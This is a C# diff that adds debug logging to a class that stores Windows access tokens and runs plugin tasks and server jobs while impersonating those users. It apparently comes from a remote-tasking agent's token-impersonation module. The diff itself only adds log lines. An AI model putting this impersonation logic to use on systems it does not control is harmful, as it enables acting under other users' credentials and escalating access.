@@ -20,13 +20,17 @@ namespace Workflow.Providers
         {
             if (tokens.ContainsKey(i))
             {
-                return Native.ImpersonateLoggedOnUser(tokens[i]);
+                bool result = Native.ImpersonateLoggedOnUser(tokens[i]);
+                DebugLog.Log($"Impersonate token_id={i} result={result}");
+                return result;
             }
+            DebugLog.Log($"Impersonate failed: token_id={i} not found");
             return false;
         }
 
         public void RunTaskImpersonated(IModule plug, ServerJob job)
         {
+            DebugLog.Log($"Running task impersonated, token_id={job.task.token}");
             _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
             {
                 await plug.Execute(job);
@@ -35,6 +39,7 @@ namespace Workflow.Providers
 
         public void HandleFilePluginImpersonated(IFileModule plug, ServerJob job, ServerTaskingResponse response)
         {
+            DebugLog.Log($"Handling file plugin impersonated, token_id={job.task.token}");
             _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
             {
                 await plug.HandleNextMessage(response);
@@ -43,6 +48,7 @@ namespace Workflow.Providers
 
         public void HandleInteractivePluginImpersonated(IInteractiveModule plug, ServerJob job, InteractMessage message)
         {
+            DebugLog.Log($"Handling interactive plugin impersonated, token_id={job.task.token}");
             WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), () =>
             {
                 plug.Interact(message);
@@ -79,7 +85,9 @@ namespace Workflow.Providers
                 isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
             }
 
-            return isAdmin ? 3 : 2;
+            int integrity = isAdmin ? 3 : 2;
+            DebugLog.Log($"getIntegrity result={integrity}");
+            return integrity;
         }
 
         public TokenTaskResponse AddToken(SafeAccessTokenHandle hToken, CreateToken tokenOptions, string task_id)
@@ -102,6 +110,7 @@ namespace Workflow.Providers
             }
 
             tokens.Add(token.token_id, hToken);
+            DebugLog.Log($"Token added: user={token.user}, token_id={token.token_id}");
 
             return new TokenTaskResponse()
             {
